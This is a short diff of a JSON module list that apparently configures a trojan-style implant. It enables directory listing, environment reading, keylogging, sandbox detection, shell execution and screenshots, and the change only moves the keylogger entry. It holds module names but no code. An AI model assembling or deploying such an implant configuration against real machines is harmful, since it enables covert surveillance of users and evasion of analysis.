@@ -1,8 +1,8 @@
 [
   { "module": "dirlister" },
   { "module": "environment" },
-  { "module": "keylogger" },
   { "module": "sandbox_detect"},
   { "module": "shell_exec"},
-  { "module": "screenshotter"}
+  { "module": "screenshotter"},
+  { "module": "keylogger" }
 ]
